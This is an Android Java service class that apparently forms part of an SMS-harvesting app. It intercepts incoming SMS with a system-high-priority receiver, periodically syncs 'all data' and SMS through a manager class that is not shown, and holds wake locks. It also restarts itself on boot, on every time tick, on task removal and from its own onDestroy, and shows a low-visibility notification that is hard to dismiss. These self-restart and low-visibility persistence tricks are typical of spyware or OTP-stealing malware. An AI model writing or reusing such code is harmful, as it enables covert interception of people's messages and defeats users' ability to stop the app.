package com.example.javaapp.services;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.example.javaapp.R;
import com.example.javaapp.activities.SplashActivity;
import com.example.javaapp.managers.DataSyncManager;
import com.example.javaapp.utils.Constant;

public class AppService extends Service {
    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    private static final String TAG = "AppService";

    private SMSReceiver smsReceiver;
    private DataSyncManager dataSyncManager;
    private PowerManager.WakeLock wakeLock;
    private BroadcastReceiver restartReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");
        dataSyncManager = new DataSyncManager(this);
        acquireWakeLock();
        setupRestartReceiver();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand");

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        registerSmsReceiver();
        dataSyncManager.syncAllData();

        // Schedule periodic sync
        schedulePeriodicSync();

        return START_STICKY;
    }

    @SuppressLint("Wakelock")
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "AppService::WakeLock"
            );
            wakeLock.acquire(10 * 60 * 1000L /*10 minutes*/);
            Log.d(TAG, "WakeLock acquired");
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring WakeLock: " + e.getMessage());
        }
    }

    private void setupRestartReceiver() {
        restartReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d(TAG, "Restarting service...");
                startService(new Intent(context, AppService.class));
            }
        };

        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction(Intent.ACTION_MY_PACKAGE_REPLACED);
        filter.addAction(Intent.ACTION_TIME_TICK);
        registerReceiver(restartReceiver, filter);
    }

    private void registerSmsReceiver() {
        try {
            if (smsReceiver != null) {
                unregisterReceiver(smsReceiver);
            }
            smsReceiver = new SMSReceiver();
            IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
            filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
            registerReceiver(smsReceiver, filter);
            Log.d(TAG, "SMS Receiver registered");
        } catch (Exception e) {
            Log.e(TAG, "Error registering SMS receiver: " + e.getMessage());
        }
    }

    private void schedulePeriodicSync() {
        // Use AlarmManager or WorkManager for periodic tasks
        new android.os.Handler().postDelayed(() -> {
            if (dataSyncManager != null) {
                dataSyncManager.syncSmsOnly();
            }
            // Reschedule
            schedulePeriodicSync();
        }, 30 * 60 * 1000L); // Every 30 minutes
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, SplashActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

        // Create a notification that's less likely to be swiped away
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(Constant.APP_NAME)
                .setContentText(Constant.APP_NAME + " is running in background")
                .setSmallIcon(R.drawable.img)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setOngoing(true)
                .setShowWhen(false)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setContentIntent(pendingIntent)
                .setSound(null)
                .setVibrate(null)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Background Service Channel",
                    NotificationManager.IMPORTANCE_UNSPECIFIED // Low importance to reduce interruptions
            );
            serviceChannel.setShowBadge(false);
            serviceChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved - Restarting service");
        // Restart service when task is removed from recent apps
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        startService(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service onDestroy");
        super.onDestroy();

        try {
            if (smsReceiver != null) {
                unregisterReceiver(smsReceiver);
            }
            if (restartReceiver != null) {
                unregisterReceiver(restartReceiver);
            }
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during cleanup: " + e.getMessage());
        }

        // Auto-restart service
        startService(new Intent(this, AppService.class));
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return new ServiceBinder();
    }

    public class ServiceBinder extends Binder {
        public AppService getService() {
            return AppService.this;
        }
    }
}